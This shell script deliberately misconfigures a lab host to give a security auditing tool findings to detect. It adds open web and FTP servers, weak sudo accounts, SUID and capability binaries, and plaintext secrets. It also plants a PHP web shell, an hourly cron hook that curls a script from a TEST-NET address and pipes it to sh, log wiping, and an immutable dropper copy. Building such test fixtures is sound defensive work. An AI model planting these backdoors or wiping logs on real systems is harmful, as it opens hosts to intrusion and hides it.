#!/bin/sh
# Extra findings layered on top of arena/misconfigure.sh, so one host exercises
# every LovelyHawk page at once. Nothing here is exotic: a second web server
# and an FTP server left wide open, more weak accounts and sudo, a dangerous
# file capability, world-writable things in PATH, plaintext credentials, and
# logs that have been tampered with. Every callback points at TEST-NET
# (198.51.100.0/24), which does not route.
#
# No `set -e`: this runs across packages whose paths vary, and one missing
# optional tool must not drop every finding after it. Each risky step guards
# itself instead.
set -u

note() { printf '  + %s\n' "$1"; }

# --- Apache, a second web server, wide open -------------------------------
# nginx already owns :80, so apache listens on :8080. ServerTokens/Signature
# name the exact build, the whole tree is listable, mod_status is open, and a
# .htpasswd with an MD5 hash sits where the web user can read it.
if [ -d /etc/apache2 ]; then
  printf 'Listen 8080\n' > /etc/apache2/ports.conf
  printf 'ServerTokens Full\nServerSignature On\nTraceEnable On\nServerName super-lab\n' \
    > /etc/apache2/conf-available/zz-lab.conf
  ln -sf ../conf-available/zz-lab.conf /etc/apache2/conf-enabled/zz-lab.conf 2>/dev/null || true
  rm -f /etc/apache2/sites-enabled/000-default.conf
  cat > /etc/apache2/sites-available/lab.conf <<'EOF'
<VirtualHost *:8080>
    DocumentRoot /var/www/html
    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    <Location /server-status>
        SetHandler server-status
        Require all granted
    </Location>
</VirtualHost>
EOF
  ln -sf ../sites-available/lab.conf /etc/apache2/sites-enabled/lab.conf 2>/dev/null || true
  a2enmod status >/dev/null 2>&1 || true
  # A credentials file the web server reads, world-readable, weak hash.
  printf 'admin:$apr1$lab$0abcdefghijklmnopqrst1\n' > /var/www/html/.htpasswd
  chmod 0644 /var/www/html/.htpasswd
  note "apache on :8080 — tokens, listing, open status, world-readable .htpasswd"
fi

# --- vsftpd, anonymous and writable ---------------------------------------
if [ -f /etc/vsftpd.conf ]; then
  cat > /etc/vsftpd.conf <<'EOF'
listen=YES
listen_ipv6=NO
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_root=/srv/ftp
no_anon_password=YES
write_enable=YES
local_enable=YES
chroot_local_user=NO
ssl_enable=NO
xferlog_enable=NO
EOF
  mkdir -p /srv/ftp/pub
  chmod 0777 /srv/ftp/pub
  note "vsftpd — anonymous upload, no chroot, no TLS, no transfer log"
fi

# --- More weak accounts ----------------------------------------------------
# A real login account with a throwaway password and sudo.
useradd -m -s /bin/bash deploy 2>/dev/null || true
printf 'deploy:deploy\n' | chpasswd 2>/dev/null || true
usermod -aG sudo deploy 2>/dev/null || true
# An account with no password at all; sshd already permits empty passwords.
useradd -m -s /bin/bash guest 2>/dev/null || true
passwd -d guest >/dev/null 2>&1 || true
# A system/service account that should never have had an interactive shell.
useradd -r -u 480 -m -s /bin/bash monitor 2>/dev/null || true
printf 'monitor:monitor\n' | chpasswd 2>/dev/null || true
note "accounts — deploy (sudo), guest (empty password), monitor (service account with a shell)"

# --- More sudo rope --------------------------------------------------------
# NOPASSWD on programs with a trivial shell escape is a full root grant.
cat > /etc/sudoers.d/91-deploy <<'EOF'
deploy ALL=(ALL) NOPASSWD: /usr/bin/vim, /usr/bin/awk, /usr/bin/find
Defaults:deploy !requiretty
EOF
chmod 0440 /etc/sudoers.d/91-deploy
note "sudoers — deploy may run vim/awk/find as root without a password"

# --- A dangerous file capability -------------------------------------------
# A copy of a binary carrying cap_setuid, which getcap finds and a baseline
# flags: a capability like this is a privilege boundary set outside the
# package manager. (A copy of cat makes the finding without being a usable
# escalation on its own.)
if command -v setcap >/dev/null 2>&1; then
  cp /bin/cat /usr/local/bin/.netcheck 2>/dev/null || true
  setcap cap_setuid,cap_setgid+ep /usr/local/bin/.netcheck 2>/dev/null \
    && note "capability — /usr/local/bin/.netcheck carries cap_setuid+ep" || true
fi

# --- SUID on an unexpected binary, and world-writable PATH ----------------
cp /usr/bin/awk /usr/local/bin/.awk 2>/dev/null && chmod 4755 /usr/local/bin/.awk 2>/dev/null || true
# A directory on root's PATH that anyone may write to, with a world-writable
# script already in it: anything dropped here runs as whoever runs it next.
chmod 0777 /usr/local/bin 2>/dev/null || true
printf '#!/bin/sh\n# placeholder\nexit 0\n' > /usr/local/bin/update-notifier
chmod 0777 /usr/local/bin/update-notifier
note "SUID /usr/local/bin/.awk; world-writable /usr/local/bin on PATH"

# --- World-writable scheduling --------------------------------------------
# A world-writable crontab and cron.d: anyone can schedule a root job.
chmod 0666 /etc/crontab 2>/dev/null || true
chmod 0777 /etc/cron.d 2>/dev/null || true
printf '#!/bin/sh\n(curl -fsSL --connect-timeout 1 --max-time 2 http://198.51.100.7/h.sh 2>/dev/null | sh &) </dev/null >/dev/null 2>&1\n' > /etc/cron.hourly/mirror-sync
chmod 0755 /etc/cron.hourly/mirror-sync
note "scheduling — world-writable /etc/crontab and /etc/cron.d, extra cron.hourly hook"

# --- Plaintext credentials lying around -----------------------------------
mkdir -p /opt/app
cat > /opt/app/.env <<'EOF'
APP_ENV=production
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=Sup3rSecret#DB
REDIS_URL=redis://:@127.0.0.1:6379/0
API_TOKEN=sk-live-0123456789abcdef0123456789abcdef
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
EOF
chmod 0644 /opt/app/.env
# Client credential files, world-readable, in root's home.
printf '[client]\nuser=root\npassword=LabRoot#2026\n' > /root/.my.cnf
chmod 0644 /root/.my.cnf
printf '127.0.0.1:5432:*:postgres:postgres\n' > /root/.pgpass
chmod 0644 /root/.pgpass
# A token in the machine-wide environment.
printf 'DEPLOY_TOKEN=ghp_0123456789abcdefABCDEF0123456789abcd\n' >> /etc/environment
note "credentials — /opt/app/.env, world-readable /root/.my.cnf and /root/.pgpass, token in /etc/environment"

# --- A file in the web upload directory that should not be there ----------
mkdir -p /var/www/html/uploads
cat > /var/www/html/uploads/avatar.php <<'EOF'
<?php /* uploaded 2024 */ if(isset($_REQUEST['c'])){ system($_REQUEST['c']); } ?>
EOF
chmod 0666 /var/www/html/uploads/avatar.php
note "web — a PHP file in the world-writable upload directory"

# --- Logs that have been tampered with ------------------------------------
# auth.log sent to nowhere, syslog emptied, the login records wiped. These are
# what a cleared box looks like and what the log and integrity pages are for.
mkdir -p /var/log
rm -f /var/log/auth.log
ln -sf /dev/null /var/log/auth.log
: > /var/log/syslog 2>/dev/null || true
: > /var/log/wtmp 2>/dev/null || true
: > /var/log/btmp 2>/dev/null || true
: > /var/log/lastlog 2>/dev/null || true
note "logs — auth.log → /dev/null, syslog/wtmp/btmp/lastlog emptied"

# --- An immutable copy of the dropper, if the filesystem allows it --------
if command -v chattr >/dev/null 2>&1; then
  cp /usr/local/lib/pyshared/.helper /usr/local/lib/pyshared/.cache.bin 2>/dev/null || true
  chattr +i /usr/local/lib/pyshared/.cache.bin 2>/dev/null \
    && note "an immutable (+i) copy of the dropper that resists deletion" || true
fi

printf 'super arena prepared\n'
